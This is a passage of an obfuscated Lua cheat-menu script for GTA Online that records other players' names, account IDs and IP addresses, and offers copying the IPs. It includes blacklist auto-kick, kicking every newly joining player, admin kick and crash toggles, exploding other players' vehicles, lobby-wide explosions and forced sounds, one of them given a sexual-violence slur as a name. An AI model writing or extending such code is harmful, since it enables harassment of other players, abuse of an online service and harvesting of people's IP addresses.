        if entity.is_an_entity(cA) and entity.is_an_entity(cB) and entity.is_an_entity(cC) then
            I.ctrl(cA)
            I.ctrl(cB)
            I.ctrl(cC)
            entity.attach_entity_to_entity(cA, cC, 0, cD, v3(), true, l["robot_collision"], false, 2, true)
            entity.attach_entity_to_entity(cB, cC, 0, cE, v3(), true, l["robot_collision"], false, 2, true)
        end
    end
end
local function cF()
    if not l["disable_history"] then
        local cG = 1
        if #aj["lobby_history"] > 1 then
            for bD = 1, #aj["lobby_history"] - 1 do
                cG = cG + #aj["lobby_history"][bD].children - 1
            end
        end
        for i = cG, #aU do
            for F = 1, #b0.children do
                if b0.children[F].name ~= aU[i]["name"] and b0 == aU[i]["lobby"] then
                    if not aU[i]["feature"] then
                        local j = aU[i]["name"]
                        local cH = aU[i]["scid"]
                        local cI = j
                        if aU[i]["player_id"] == c.id() then
                            cI = cI .. " [Y]"
                        end
                        if player.is_player_friend(aU[i]["player_id"]) then
                            cI = cI .. " [F]"
                        end
                        local cJ = b8(cI, b0.id).id
                        bb(
                            "NAME: " .. j,
                            cJ,
                            function()
                                utils.to_clipboard(j)
                                o("Copied NAME to clipboard!", 21)
                            end
                        )
                        bb(
                            "SCID: " .. cH,
                            cJ,
                            function()
                                utils.to_clipboard(cH)
                                o("Copied SCID to clipboard!", 21)
                            end
                        )
                        bb(
                            "IP: " .. aU[i]["ip"],
                            cJ,
                            function()
                                utils.to_clipboard(aU[i]["ip"])
                                o("Copied IP to clipboard!", 21)
                            end
                        )
                        bb("PlayerID: " .. aU[i]["player_id"], cJ)
                        bb("First seen: " .. aU[i]["first_seen"], cJ)
                        bb(
                            "Add Player to Blacklist",
                            cJ,
                            function()
                                if cH == K.scid(c.id()) or cH == -1 then
                                    o("Choose valid Player.")
                                else
                                    local G = c.o(p .. "\\CustomFiles\\2Take1Blacklist.cfg", "a")
                                    io.output(G)
                                    io.write(cH .. " " .. j .. "\n")
                                    io.close(G)
                                    o("Player " .. j .. " added to Blocklist.", 48)
                                    s("Player " .. j .. " with SCID: " .. cH .. " added to Blacklist.")
                                end
                            end
                        )
                        bb(
                            "Add Player to Remember-Modder",
                            cJ,
                            function()
                                if cH == K.scid(c.id()) or cH == -1 then
                                    o("Choose valid Player.")
                                else
                                    local cK = c.o(p .. "\\CustomFiles\\2Take1Modders.cfg", "a")
                                    io.output(cK)
                                    io.write(cH .. " " .. j .. "\n")
                                    io.close(cK)
                                    o("Modder " .. j .. " added to Remember-List.", 130)
                                    s("Modder '" .. j .. "' added to Remember-List.")
                                end
                            end
                        )
                        bb(
                            "Copy Outfit",
                            cJ,
                            function()
                                local cL = player.is_player_female(c.id())
                                if cL == aU[i]["is_female"] then
                                    local cM = aU[i]["h_clothes"]
                                    local cN = aU[i]["h_textures"]
                                    for F = 1, 11 do
                                        ped.set_ped_component_variation(M.ped(), F, cM[F], cN[F], 2)
                                    end
                                    local cO = {0, 1, 2, 6, 7}
                                    local cP = aU[i]["h_prop_ind"]
                                    local cQ = aU[i]["h_prop_text"]
                                    for cR = 1, #cO do
                                        ped.set_ped_prop_index(M.ped(), cO[cR], cP[cR], cQ[cR], 0)
                                    end
                                else
                                    o("Unluckily, you have the wrong gender!", 21)
                                end
                            end
                        )
                        bb(
                            "Is " .. j .. " in the current lobby?",
                            cJ,
                            function()
                                for F = 0, 31 do
                                    if K.scid(F) == cH then
                                        o(j .. " is in your lobby!", 21)
                                        return HANDLER_POP
                                    end
                                end
                                o(j .. " is ~h~NOT~h~ in your lobby!", 21)
                            end
                        )
                        bb(
                            "Was he a modder?",
                            cJ,
                            function()
                                local cH = aU[i]["scid"]
                                if not ak["log_modder_flags"].on then
                                    o("Enabel 'Log Modder Flags' in Misc -> Dev Tools", 39)
                                elseif not b2[cH] then
                                    o("He was not flagged with any Modder-Flags", 21)
                                else
                                    for F = 1, #v do
                                        if b2[cH][v[F]] then
                                            local cS = v[F]
                                            local f = player.get_modder_flag_text(cS)
                                            o(j .. " had '" .. f .. "' as a Flag!", 21)
                                        end
                                    end
                                end
                            end
                        )
                        aU[i]["feature"] = true
                    end
                end
            end
        end
        local cT = aj["lobby_history"]
        if #cT > 1 then
            for i = 2, #cT do
                local cU = #cT[i].children == 1
                local cV = #cT[i - 1].children == 1
                if cU and cV then
                    cT[i].hidden = true
                end
            end
        end
    end
end
local function cW(bM, cX)
    s("Attempt to spawn Custom Vehicle.")
    c.navigate(false)
    temp_veh = {}
    local bp = v3()
    local cY = v3()
    local cZ = 0
    local c_ = 0
    local b_ = 0
    local d0 = false
    local d1 = ped.get_vehicle_ped_is_using(M.ped())
    if ak["spawn_preview"].on and a0["preview_veh"][1] ~= nil then
        bk(a0["preview_veh"])
        a0["preview_veh"] = {}
        ap = false
        c.wait(250)
    end
    for i = 1, #bM[1] do
        I.model(bM[1][i], 7500)
    end
    for i = 2, #bM do
        bp = M.coords()
        if bM[i][6] ~= nil and i == 2 then
            bp.z = bp.z + bM[i][6]
        end
        if i > 2 then
            bp.z = bp.z + 25
        end
        if
            ak["use_own_veh"].on and i == 2 and entity.get_entity_model_hash(d1) == bM[i][1] or
                bM[2][1] == 0 and i == 2 and ak["use_own_veh"].on and d1 ~= 0
         then
            s("Detected Own Vehicle, using it.")
            temp_veh[i - 1] = d1
            d0 = true
        elseif bM[2][1] == 0 and not ak["use_own_veh"].on then
            s("Failed at spawning Custom Vehicle.")
            o("No Vehicle found, get in a valid Vehicle")
            c.navigate(true)
            return
        else
            if streaming.is_model_a_vehicle(bM[i][1]) then
                if i == 2 then
                    b_ = M.heading()
                    if bM[i][11] ~= nil then
                        aq = bM[i][11]
                    else
                        aq = 5
                    end
                    if bM[i][12] ~= nil then
                        ao = bM[i][12]
                    else
                        ao = 1
                    end
                    bp = bZ(bp, b_, aq)
                end
                temp_veh[i - 1] = vehicle.create_vehicle(bM[i][1], bp, b_, true, false)
                decorator.decor_set_int(temp_veh[i - 1], "MPBitset", 1 << 10)
                local d2 = c.random(0, 16777215)
                if bM[i][4] ~= nil then
                    d2 = bM[i][4][1]
                end
                vehicle.set_vehicle_custom_primary_colour(temp_veh[i - 1], d2)
                if bM[i][4] ~= nil then
                    d2 = bM[i][4][2]
                end
                vehicle.set_vehicle_custom_secondary_colour(temp_veh[i - 1], d2)
                if bM[i][4] ~= nil then
                    d2 = bM[i][4][3]
                end
                vehicle.set_vehicle_custom_pearlescent_colour(temp_veh[i - 1], d2)
                if bM[i][4] ~= nil then
                    d2 = bM[i][4][4]
                end
                vehicle.set_vehicle_custom_wheel_colour(temp_veh[i - 1], d2)
                d2 = c.random(0, 4)
                if bM[i][4] ~= nil then
                    d2 = bM[i][4][5]
                end
                vehicle.set_vehicle_window_tint(temp_veh[i - 1], d2)
                if streaming.is_model_a_plane(bM[i][1]) and i > 2 then
                    vehicle.control_landing_gear(temp_veh[i - 1], 3)
                end
            else
                temp_veh[i - 1] = object.create_object(bM[i][1], bp, true, false)
            end
        end
        if i > 2 then
            bp.z = bp.z - 25
        end
        if ak["set_godmode"].on then
            entity.set_entity_god_mode(temp_veh[i - 1], true)
        end
        if bM[i][5] then
            entity.set_entity_visible(temp_veh[i - 1], false)
        end
        if bM[i][13] then
            entity.set_entity_alpha(temp_veh[i - 1], bM[i][13], false)
        end
        if i > 2 then
            cZ = 0
            if bM[i][7] ~= nil then
                cZ = bM[i][7]
            end
            c_ = temp_veh[1]
            if bM[i][8] ~= nil then
                c_ = temp_veh[bM[i][8]]
            end
            local d3 = bM[i][10]
            if d3 == true then
                entity.set_entity_collision(temp_veh[i - 1], false, false, false)
            else
                d3 = false
            end
            bp = v3()
            if bM[i][2] ~= nil then
                bp = v3(bM[i][2][1], bM[i][2][2], bM[i][2][3])
            end
            cY = v3()
            if bM[i][3] ~= nil then
                cY = v3(bM[i][3][1], bM[i][3][2], bM[i][3][3])
            end
            if bM[i][1] ~= 0 then
                entity.attach_entity_to_entity(temp_veh[i - 1], c_, cZ, bp, cY, false, not d3, false, 2, true)
            end
            if bM[i][9] ~= nil then
                local d4
                I.model(bM[i][9])
                bp = M.coords()
                d4 = ped.create_ped(6, bM[i][9], bp, 0.0, true, false)
                c.wait(0)
                if ak["set_godmode"].on then
                    ped.set_ped_max_health(d4, 25000000.0)
                    ped.set_ped_health(d4, 25000000.0)
                    ped.set_ped_can_ragdoll(d4, false)
                    entity.set_entity_god_mode(d4, true)
                end
                c.unload(bM[i][9])
                if bM[i][1] ~= 0 then
                    ped.set_ped_into_vehicle(d4, temp_veh[i - 1], -1)
                    vehicle.set_vehicle_doors_locked(temp_veh[i - 1], 2)
                else
                    bp = v3()
                    if bM[i][2] ~= nil then
                        bp = v3(bM[i][2][1], bM[i][2][2], bM[i][2][3])
                    end
                    cY = v3()
                    if bM[i][3] ~= nil then
                        cY = v3(bM[i][3][1], bM[i][3][2], bM[i][3][3])
                    end
                    entity.attach_entity_to_entity(d4, c_, cZ, bp, cY, false, not d3, true, 2, true)
                end
            end
        end
        if ak["spawn_preview"].on then
            a0["preview_veh"][#a0["preview_veh"] + 1] = temp_veh[i - 1]
        elseif cX == 1 then
            aR[#aR + 1] = temp_veh[i - 1]
        elseif cX == 2 then
            aI[#aI + 1] = temp_veh[i - 1]
        elseif cX == 3 then
            aJ[#aJ + 1] = temp_veh[i - 1]
        else
            a0["custom_veh"][#a0["custom_veh"] + 1] = temp_veh[i - 1]
        end
    end
    if not ak["spawn_preview"].on then
        if ak["auto_get_in"].on then
            ped.set_ped_into_vehicle(M.ped(), temp_veh[1], -1)
        end
    end
    if not d0 then
        bW(temp_veh[1])
    end
    for i = 1, #bM[1] do
        c.unload(bM[1][i])
    end
    c.navigate(true)
    s("Spawn Custom Vehicle Done.")
end
local function d5()
    s("Loading Features...")
    local d6 =
        bc(
        "Detect lobby change for history",
        0,
        function(k)
            if k.on and not l["disable_history"] then
                if b0 == nil and b1 == nil then
                    aj["lobby_history"][1] =
                        b8(
                        "Lobby 1",
                        aj["player_history"],
                        function()
                            cF()
                        end
                    )
                    b8("Lobby Information", aj["lobby_history"][1].id).hidden = true
                    b0 = aj["lobby_history"][1]
                    event.add_event_listener(
                        "player_join",
                        function(J)
                            if J.player == c.id() and not l["disable_history"] then
                                local cT = aj["lobby_history"]
                                local d7 = #cT + 1
                                aj["lobby_history"][d7] =
                                    b8(
                                    "Lobby " .. d7,
                                    aj["player_history"],
                                    function()
                                        cF()
                                    end
                                )
                                local d8 = #cT - 1
                                local bH = cT[d8].children
                                b8("Lobby Information", cT[d7].id).hidden = true
                                b0 = aj["lobby_history"][d7]
                                bH[1].hidden = false
                                bb("Logged " .. #bH - 1 .. " Players in this Lobby!", bH[1].id)
                                bb(
                                    "Hide this lobby from History",
                                    bH[1].id,
                                    function()
                                        cT[d7 - 1].hidden = true
                                    end
                                )
                            end
                        end
                    )
                end
            end
            return d.stop(k)
        end
    )
    d6.on = true
    d6.hidden = true
    local d9 =
        bc(
        "Get History",
        0,
        function(k)
            if k.on and not l["disable_history"] then
                cF()
                c.wait(1000)
                for i = 0, 31 do
                    if c.valid(i) then
                        local da = true
                        for F = 1, #aU do
                            if #aU ~= 0 then
                                local cU = K.scid(i) == aU[F]["scid"]
                                local cV = K.name(i) == aU[F]["name"]
                                local db = i == aU[F]["player_id"]
                                local dc = b0 == aU[F]["lobby"]
                                if cU and cV and db and dc then
                                    da = false
                                end
                            end
                        end
                        if da then
                            local cN = {}
                            local cM = {}
                            for cR = 1, 11 do
                                cN[cR] = ped.get_ped_texture_variation(c.ped(i), cR)
                                cM[cR] = ped.get_ped_drawable_variation(c.ped(i), cR)
                            end
                            local cP = {}
                            local cQ = {}
                            local cO = {0, 1, 2, 6, 7}
                            for cR = 1, #cO do
                                cP[cR] = ped.get_ped_prop_index(c.ped(i), cO[cR])
                                cQ[cR] = ped.get_ped_prop_texture_index(c.ped(i), cO[cR])
                            end
                            aU[#aU + 1] = {
                                ["scid"] = K.scid(i),
                                ["name"] = K.name(i),
                                ["ip"] = K.ip(i),
                                ["first_seen"] = d.time_prefix(),
                                ["is_female"] = player.is_player_female(i),
                                ["h_textures"] = cN,
                                ["h_clothes"] = cM,
                                ["h_prop_ind"] = cP,
                                ["h_prop_text"] = cQ,
                                ["lobby"] = b0,
                                ["player_id"] = i,
                                ["feature"] = false
                            }
                        end
                    end
                    c.wait(50)
                end
            end
            return d.stop(k)
        end
    )
    d9.hidden = true
    d9.on = true
    if l["2t1s_parent"] then
        aj["parent"] = b8("2Take1Script", 0).id
    end
    aj["bl"] = b8("Blacklist", aj["parent"])
    aj["bl"].hidden = l["bl_hidden"]
    aj["bl"] = aj["bl"].id
    ak["blacklist_enabled"] =
        bc(
        "Enable Blacklist",
        aj["bl"],
        function(k)
            l["blacklist_enabled"] = k.on
            if k.on then
                c.wait(1000)
                bA()
                for i = 0, 31 do
                    if N.i(i) then
                        for dd = 1, #aw do
                            if tostring(K.scid(i)) == aw[dd] then
                                local j = K.name(i)
                                o("Blocked player detected.", 27)
                                o("Current name: " .. j .. "\nReal name: " .. ax[dd], 27)
                                s("")
                                s("Blocked Player detected.")
                                s(j .. ":" .. aw[dd])
                                s("Real name:" .. ax[dd])
                                if ak["mark_modder"].on then
                                    player.set_player_as_modder(i, n["blacklist"][2])
                                end
                                if ak["auto_kick"].on then
                                    bG(false, i)
                                end
                            end
                        end
                    end
                end
            end
            return d.stop(k)
        end
    )
    ak["blacklist_enabled"].on = l["blacklist_enabled"]
    ak["auto_kick"] =
        bc(
        "Enable Auto-Kick",
        aj["bl"],
        function(k)
            l["auto_kick"] = k.on
        end
    )
    ak["auto_kick"].on = l["auto_kick"]
    ak["mark_modder"] =
        bc(
        "Mark as Modder",
        aj["bl"],
        function(k)
            l["mark_modder"] = k.on
        end
    )
    ak["mark_modder"].on = l["mark_modder"]
    bb(
        "Add player by SCID",
        aj["bl"],
        function()
            local J, cH = input.get("Enter SCID", "", 10, 3)
            while J == 1 do
                c.wait(0)
                J, cH = input.get("Enter SCID", "", 10, 3)
            end
            if J == 2 then
                return HANDLER_POP
            end
            local J, j = input.get("Enter Name", "", 64, 0)
            while J == 1 do
                c.wait(0)
                J, j = input.get("Enter Name", "", 64, 0)
            end
            if J == 2 then
                return HANDLER_POP
            end
            if j ~= "" and cH ~= "0" and cH ~= "-1" and cH ~= tostring(K.scid(c.id())) then
                d.write(c.o(b["Blacklist.cfg"], "a"), cH .. " " .. j)
                o("SCID with Name added to Blacklist.", 48)
                s("")
                s("Player added to Blacklist.")
                s(j .. ": " .. cH)
            end
        end
    )
    bb(
        "Count Currently Blocked Players",
        aj["bl"],
        function()
            bA()
            if aw ~= nil then
                o("Currently blocking " .. #aw .. " Players.")
            end
        end
    )
    ak["enable_admin"] =
        bc(
        "Notify on Rockstar Admin SCID",
        aj["bl"],
        function(k)
            if k.on then
                c.wait(1000)
                for i = 0, 31 do
                    if N.i(i) then
                        for dd = 1, #_ do
                            if tostring(K.scid(i)) == _[dd] then
                                local j = K.name(i)
                                o("Rockstar Admin by SCID detected!\nName: " .. j, 27)
                                s("Rockstar Admin detected.")
                                s(j .. ":" .. K.scid(i))
                                if ak["kick_admin"].on then
                                    bG(false, i)
                                end
                                if ak["crash_admin"].on then
                                    bT(i)
                                end
                            end
                        end
                    end
                end
            end
            l["admin_enabled"] = k.on
            return d.stop(k)
        end
    )
    ak["enable_admin"].on = l["admin_enabled"]
    ak["kick_admin"] =
        bc(
        "Enable Auto-Kick Rockstar Admin",
        aj["bl"],
        function()
            o(
                "Thats the stupidest idea you ever had! Dont enable it, disable it!\nThis will get u banned for like 99%!",
                27
            )
        end
    )
    ak["kick_admin"].hidden = not ah
    ak["crash_admin"] =
        bc(
        "Enable Auto-Crash Rockstar Admin",
        aj["bl"],
        function()
            o(
                "Thats the stupidest idea you ever had! Dont enable it, disable it!\nThis will get u banned for like 99%!",
                27
            )
        end
    )
    ak["crash_admin"].hidden = not ah
    ak["kick_joining"] =
        bc(
        "Kick new joining Players",
        aj["bl"],
        function(k)
            if k.on then
                local time = c.time() + 2500
                while time > c.time() do
                    c.wait(250)
                    l["kick_joining"] = k.on
                end
                if aS[1] == nil then
                    for i = 0, 31 do
                        aS[i + 1] = K.scid(i)
                        aT[K.scid(i)] = 0
                    end
                end
                for i = 0, 31 do
                    if N.i(i) then
                        local E = true
                        for F = 1, #aS do
                            if aS[F] == K.scid(i) then
                                E = false
                            end
                        end
                        if E then
                            if aT[aS[i + 1]] <= 3 then
                                o(K.name(i) .. " is new here, sending greetings..!", 65)
                                s(K.name(i) .. " is new here, sending greetings..!")
                                bG(false, i)
                                aT[aS[i + 1]] = aT[aS[i + 1]] + 1
                            else
                                aT[aS[i + 1]] = aT[aS[i + 1]] + 1
                                if aT[aS[i + 1]] >= 17 then
                                    aT[aS[i + 1]] = 0
                                end
                            end
                        end
                    end
                end
            end
            if not k.on then
                aT = {}
                for i = 0, 31 do
                    aS[i + 1] = nil
                end
            end
            l["kick_joining"] = k.on
            return d.stop(k)
        end
    )
    ak["kick_joining"].on = l["kick_joining"]
    aj["modder"] = b8("Modders", aj["parent"])
    aj["modder"].hidden = l["modder_hidden"]
    aj["modder"] = aj["modder"].id
    ak["remember_modder"] =
        bc(
        "Remember every Modder",
        aj["modder"],
        function(k)
            if k.on then
                if utils.file_exists(b["Modders"]) then
                    local G = c.o(b["Modders"], "r")
                    if G ~= nil then
                        local bQ = {}
                        ay = {}
                        for de in io.lines(b["Modders"]) do
                            while string.find(de, " ", 1) ~= nil do
                                de = de:gsub("(.*)%s.*$", "%1")
                            end
                            bQ[#bQ + 1] = de
                        end
                        ay = bQ
                        io.close(G)
                    end
                end
                for i = 0, 31 do
                    if N.i(i) then
                        local cH = K.scid(i)
                        local df = false
                        if ay[1] ~= nil then
                            for dg = 1, #ay do
                                if tostring(cH) == ay[dg] then
                                    df = true
                                    if not player.is_player_modder(i, -1) then
                                        o("Remembered " .. K.name(i) .. " as a Modder, remarking...", 130)
                                        s("Remembered '" .. K.name(i) .. "' as a Modder, remarking...")
                                        player.set_player_as_modder(i, n["remembered"][2])
                                    end
                                end
                            end
                        end
                        if player.is_player_modder(i, -1) and not df then
                            d.write(c.o(b["Modders"], "a"), cH .. " " .. K.name(i))
                            o("Modder " .. K.name(i) .. " added to Remember-List.", 130)
                            s("Modder '" .. K.name(i) .. "' added to Remember-List.")
                        end
                    end
                end
            end
            l["remember_modder"] = k.on
            return d.stop(k)
        end
    )
    ak["remember_modder"].on = l["remember_modder"]
    bb("Modder-Detection:", aj["modder"])
    ak["speed_bypass"] =
        bc(
        "Max-Speed-Bypass",
        aj["modder"],
        function(k)
            if k.on then
                for i = 0, 31 do
                    local cH = K.scid(i)
                    if
                        N.modder(i) and player.get_player_health(i) ~= 0 and
                            interior.get_interior_from_entity(c.ped(i)) == 0
                     then
                        local dh = 45
                        local id = c.ped(i)
                        if
                            ai.is_task_active(id, 403) or ai.is_task_active(id, 408) or ai.is_task_active(id, 335) or
                                ai.is_task_active(id, 2) or
                                ai.is_task_active(id, 422)
                         then
                            dh = 95
                        end
                        if ai.is_task_active(id, 97) or ai.is_task_active(id, 38) or ai.is_task_active(id, 160) then
                            dh = 60
                        end
                        if ai.is_task_active(id, 50) or ai.is_task_active(id, 1) then
                            dh = 100
                        end
                        local bq = ped.get_vehicle_ped_is_using(id)
                        if bq ~= 0 then
                            if id == vehicle.get_ped_in_vehicle_seat(bq, -1) then
                                id = bq
                                local cf = entity.get_entity_model_hash(bq)
                                if streaming.is_model_a_plane(cf) then
                                    dh = 170
                                else
                                    dh = 100
                                end
                            end
                        end
                        local di = entity.get_entity_speed(id)
                        di = math.floor(di)
                        if di > dh then
                            o(
                                K.name(i) ..
                                    " bypassed Max-Speed-Limit of: " ..
                                        dh .. " with a speed of: " .. di .. "\nMarking him as a Modder...",
                                130
                            )
                            s(K.name(i) .. " bypassed Max-Speed-Limit of: " .. dh .. " with a speed of: " .. di)
                            s("Marking him as a Modder...")
                            for dg = 0, 600 do
                                if ai.is_task_active(c.ped(i), dg) then
                                    s("Current active Task: " .. dg)
                                end
                            end
                            player.set_player_as_modder(i, n["maxspeed"][2])
                        end
                    end
                end
            end
            l["speed_bypass"] = k.on
            return d.stop(k)
        end
    )
    ak["speed_bypass"].on = l["speed_bypass"]
    ak["name_bypass"] =
        bc(
        "Illegal Name",
        aj["modder"],
        function(k)
            if k.on then
                for i = 0, 31 do
                    local cH = K.scid(i)
                    if N.modder(i) then
                        local j = K.name(i)
                        if string.len(j) < 6 or string.len(j) > 16 or not string.find(j, "^[%-%w_]+$") then
                            o(j .. " has an illegal name!\nMarking him as a Modder...", 130)
                            s(j .. " has an illegal name!")
                            s("Marking him as a Modder...")
                            player.set_player_as_modder(i, n["illegalname"][2])
                        end
                    end
                end
            end
            l["name_bypass"] = k.on
            return d.stop(k)
        end
    )
    ak["name_bypass"].on = l["name_bypass"]
    ak["modded_ip_scid"] =
        bc(
        "Modded IP / SCID",
        aj["modder"],
        function(k)
            if k.on then
                for i = 0, 31 do
                    if N.modder(i) then
                        local j = K.name(i)
                        local dj = player.get_player_ip(i)
                        for dd = 1, #aa do
                            if dj == aa[dd] then
                                o(j .. " has an modded IP!\nMarking him as a Modder...", 130)
                                s(j .. " has an modded IP!")
                                s("Marking him as a Modder...")
                                player.set_player_as_modder(i, n["moddedip"][2])
                            end
                        end
                        local cH = K.scid(i)
                        if cH < 10000 or cH > 234567891 then
                            o(j .. " has an modded SCID!\nMarking him as a Modder...", 130)
                            s(j .. " has an modded SCID!")
                            s("Marking him as a Modder...")
                            player.set_player_as_modder(i, n["moddedscid"][2])
                        end
                        for dd = 1, #ab do
                            if cH == ab[dd] then
                                o(j .. " has an modded SCID!\nMarking him as a Modder...", 130)
                                s(j .. " has an modded SCID!")
                                s("Marking him as a Modder...")
                                player.set_player_as_modder(i, n["moddedscid"][2])
                            end
                        end
                    end
                end
            end
            l["modded_ip_scid"] = k.on
            return d.stop(k)
        end
    )
    ak["modded_ip_scid"].on = l["modded_ip_scid"]
    ak["modded_net_events"] =
        bc(
        "Modded Net-Events",
        aj["modder"],
        function()
            if aX == nil then
                aX = hook.register_net_event_hook(cw)
            else
                hook.remove_net_event_hook(aX)
                aX = nil
            end
            l["modded_net_events"] = ak["modded_net_events"].on
        end
    )
    ak["modded_net_events"].on = l["modded_net_events"]
    ak["modder_force_sh"] =
        bc(
        "Forcing Script-Host",
        aj["modder"],
        function(k)
            l["modder_force_sh"] = k.on
            if k.on then
                if aC == nil then
                    aC = script.get_host_of_this_script()
                end
                local time = c.time() + 17500
                while time > c.time() do
                    c.wait(250)
                    l["modder_force_sh"] = k.on
                end
                local dk = script.get_host_of_this_script()
                if not c.valid(aC) or K.scid(aC) == -1 then
                    aC = nil
                end
                if aC ~= nil then
                    if aC ~= dk then
                        if c.valid(aC) and c.valid(dk) then
                            if K.scid(aC) ~= -1 and K.scid(dk) ~= -1 then
                                s("Script-Host changed without previous SH leaving!")
                                s("SH changed from '" .. K.name(aC) .. "' to '" .. K.name(dk) .. "'.")
                                o("Script-Host changed from '" .. K.name(aC) .. "' to '" .. K.name(dk) .. "'.", 130)
                                player.set_player_as_modder(dk, n["force_sh"][2])
                                aC = dk
                            end
                        end
                    end
                end
            end
            return d.stop(k)
        end
    )
    ak["modder_force_sh"].on = l["modder_force_sh"]
    aj["lobby"] = b8("Lobby", aj["parent"])
    aj["lobby"].hidden = l["lobby_hidden"]
    aj["lobby"] = aj["lobby"].id
    aj["bl_veh"] = b8("Block Vehicles in Session", aj["lobby"]).id
    ak["veh_blacklist"] =
        bc(
        "Activate Block Vehicles",
        aj["bl_veh"],
        function(k)
            l["veh_blacklist"] = k.on
            if k.on then
                local time = c.time() + 2000
                while time > c.time() do
                    c.wait(200)
                    l["veh_blacklist"] = k.on
                end
                for i = 0, 31 do
                    if N.i(i) then
                        local bq = ped.get_vehicle_ped_is_using(c.ped(i))
                        if bq ~= 0 then
                            bq = entity.get_entity_model_hash(bq)
                            for bD = 1, #U do
                                if ak[U[bD][1]].on and bq == U[bD][2] then
                                    s("Detected Blacklisted Vehicle " .. U[bD][1] .. " in Session!")
                                    bq = ped.get_vehicle_ped_is_using(c.ped(i))
                                    I.ctrl(bq, 100)
                                    if entity.get_entity_god_mode(bq) then
                                        I.ctrl(bq)
                                        entity.set_entity_god_mode(bq, false)
                                    end
                                    if not entity.get_entity_god_mode(bq) then
                                        s("Exploding User: " .. K.name(i))
                                        o(
                                            "Detected Blacklisted Vehicle " ..
                                                U[bD][1] .. " from user: " .. K.name(i) .. ", exploding it!",
                                            28
                                        )
                                        entity.set_entity_velocity(bq, v3())
                                        vehicle.set_vehicle_forward_speed(bq, 0)
                                        vehicle.set_vehicle_out_of_control(bq, false, true)
                                        fire.add_explosion(c.gcoords(c.ped(i)), 59, false, true, 1, c.ped(i))
                                    end
                                end
                            end
                        end
                    end
                end
            end
            return d.stop(k)
        end
    )
    ak["veh_blacklist"].on = l["veh_blacklist"]
    for i = 1, #U do
        ak[U[i][1]] =
            bc(
            "Block: " .. U[i][1],
            aj["bl_veh"],
            function(k)
                l[U[i][1]] = k.on
            end
        )
        ak[U[i][1]].on = l[U[i][1]]
    end
    aj["bl_area"] = b8("Block Areas", aj["lobby"]).id
    ak["teleport_to_block"] =
        bc(
        "Teleport to Block",
        aj["bl_area"],
        function(k)
            l["teleport_to_block"] = k.on
        end
    )
    ak["teleport_to_block"].on = l["teleport_to_block"]
    bb(
        "Clear blocking Objects",
        aj["bl_area"],
        function()
            bk(a0["bl_objects"])
            a0["bl_objects"] = {}
        end
    )
    aj["bl_area_lsc"] = b8("Block LSCs", aj["bl_area"]).id
    for i = 1, #W do
        bb(
            W[i][1],
            aj["bl_area_lsc"],
            function()
                ch(W[i][2])
            end
        )
    end
    aj["bl_area_casino"] = b8("Block Casino", aj["bl_area"]).id
    for i = 1, #X do
        bb(
            X[i][1],
            aj["bl_area_casino"],
            function()
                ch(X[i][2])
            end
        )
    end
    aj["bl_area_mazebank"] = b8("Block Maze Bank", aj["bl_area"]).id
    for i = 1, #Y do
        bb(
            Y[i][1],
            aj["bl_area_mazebank"],
            function()
                ch(Y[i][2])
            end
        )
    end
    aj["bl_area_custom"] = b8("Custom Areas", aj["bl_area"]).id
    for i = 1, #a6 do
        bb(
            a6[i][1],
            aj["bl_area_custom"],
            function()
                ch(a6[i][2])
            end
        )
    end
    aj["explode"] = b8("Explosion-Features", aj["lobby"]).id
    ak["laser_beam_explode_waypoint"] =
        bb(
        "Laser Beam Explode Waypoint",
        aj["explode"],
        function()
            local dl = ui.get_waypoint_coord()
            if dl.x ~= 16000 then
                local dm = c.gcoords(M.ped()).z + 175
                for i = dm, -50, -2 do
                    local bp = v3(dl.x, dl.y, i)
                    bp.x = math.floor(bp.x)
                    bp.y = math.floor(bp.y)
                    fire.add_explosion(bp, 59, true, false, 0, 0)
                    for bD = 1, 2 do
                        bp.x = c.random(bp.x - 3, bp.x + 3)
                        bp.y = c.random(bp.y - 3, bp.y + 3)
                        fire.add_explosion(bp, 59, true, false, 0, 0)
                    end
                    bp.x = c.random(bp.x - 6, bp.x + 6)
                    bp.y = c.random(bp.y - 6, bp.y + 6)
                    fire.add_explosion(bp, 8, true, false, 0, 0)
                    c.wait(0)
                end
            else
                o("No Waypoint found, set a waypoint first!")
            end
        end
    )
    ak["explode_lobby"] =
        bd(
        "Random Explosions",
        "value_i",
        aj["explode"],
        function(k)
            if k.on then
                local bp = v3()
                for i = 1, 5 do
                    bp.x = c.random(-2700, 2700)
                    bp.y = c.random(-3300, 7500)
                    bp.z = c.random(30, 90)
                    fire.add_explosion(bp, ak["explode_lobby"].value_i, true, false, 0, 0)
                end
            end
            l["explode_lobby_value"] = k.value_i
            l["explode_lobby"] = k.on
            return d.stop(k)
        end
    )
    ak["explode_lobby"].max_i = 74
    ak["explode_lobby"].min_i = 0
    ak["explode_lobby"].value_i = l["explode_lobby_value"]
    ak["explode_lobby"].on = l["explode_lobby"]
    ak["explode_lobby_shake"] =
        bc(
        "Shake Cam",
        aj["explode"],
        function(k)
            if k.on then
                local bp = v3()
                for i = 1, 10 do
                    bp.x = c.random(-2700, 2700)
                    bp.y = c.random(-3300, 7500)
                    bp.z = c.random(30, 90)
                    fire.add_explosion(bp, 8, false, true, 20, 0)
                end
            end
            l["explode_lobby_shake"] = k.on
            return d.stop(k)
        end
    )
    ak["explode_lobby_shake"].on = l["explode_lobby_shake"]
    aj["sound"] = b8("Sound-Features", aj["lobby"]).id
    ak["sound_rape"] =
        bc(
        "Sound Rape",
        aj["sound"],
        function(k)
            if k.on then
                for i = 0, 31 do
                    if N.i(i) then
                        audio.play_sound_from_entity(2, "Wasted", c.ped(i), "DLC_IE_VV_General_Sounds")
                    end
                end
            end
            l["sound_rape"] = k.on
            return d.stop(k)
        end
    )
    ak["sound_rape"].on = l["sound_rape"]
    bb(
        "Garage-Door Sound - Infinite Time",
        aj["sound"],
        function()
            for i = 0, 31 do
                if N.i(i) then
                    audio.play_sound_from_entity(2, "Garage_Door", c.ped(i), "DLC_HEISTS_GENERIC_SOUNDS")
                end
            end
        end
    )
    ak["kill_all_peds"] =
        bc(
        "Kill all PEDs",
        aj["lobby"],
        function(k)
            if k.on then
                local dn = ped.get_all_peds()
                for i = 1, #dn do
                    if not ped.is_ped_a_player(dn[i]) then
                        ped.set_ped_health(dn[i], 0)
                    end
                end
            end
            l["kill_all_peds"] = k.on
            return d.stop(k)
        end
    )
    ak["kill_all_peds"].on = l["kill_all_peds"]
    aj["lobby_vehicle"] = b8("Vehicles", aj["lobby"]).id
    ak["disablecontrol"] =
        bc(
        "Disable Control from near Vehicles",
        aj["lobby_vehicle"],
        function(k)
            if k.on then
                for i = 0, 31 do
                    if N.i(i) then
